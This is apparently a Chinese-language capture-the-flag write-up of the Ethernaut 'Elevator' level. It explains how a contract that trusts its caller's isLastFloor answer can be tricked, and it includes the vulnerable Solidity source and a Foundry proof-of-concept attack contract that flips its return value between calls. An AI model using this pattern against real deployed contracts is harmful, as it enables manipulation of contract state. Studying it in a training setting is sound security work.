---
title: "Elevator"
date: 2026-07-20
draft: false
description: "通过可变返回值到达电梯顶层"
tags:
  - Ethernaut
  - 接口调用
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Elevator

### 目标：

成功使电梯到达顶层。

### 思路：

我刚开始写代码时，并没有写中间合约，发生了报错，结果是因为源码中含有`Building building = Building(msg.sender)`,`msg.sender`为我的钱包地址，而且源码中有返回值，钱包并不会接收返回值，所以发生了报错。

观察源码中的函数，只有`goTo`函数可以被调用。在执行这个函数过程中，需要执行两次`isLastFloor`函数，第一次是执行if条件时，第二次在if函数内部，`!building.isLastFloor(_floor)`代表第一次调用时需要返回`false`，而第二次调用时`top = building.isLastFloor(floor)`，需要返回`true`才能成功到达顶层，在我写攻击脚本的时候，原本想把`isLastFloor(uint)`函数也写在接口中，但是执行后发现找不到这个函数，如果不在接口中写`isLastFloor(uint)`函数，同样不会找到这个函数，最后发现在我的攻击合约中写下完整的`isLastFloor(uint)`函数的逻辑即可成功执行。先把`key`设为`true`，第一次调用`isLastFloor(uint)`函数会变为`false`，第二次会变为`true`，正好满足源码的要求。

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

### Poc：

 ```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
 
 interface ITarget{
     function goTo(uint256 _floor) external;
 }
 
 contract Middle_contract{
     ITarget public target = ITarget(0x66BC238a0def551b56ca13C8b1f81347346B2440);
     bool private key = true;
     function isLastFloor(uint256) external returns (bool){
         key = !key;
         return key;
     }
     function hack() external{
         target.goTo(2);
     }
 }
 
 contract Attack is Script{
     function run() external{
         vm.startBroadcast();
 
         Middle_contract middle_contract = new Middle_contract();
         middle_contract.hack();
 
         vm.stopBroadcast();
     }
 }
 ```
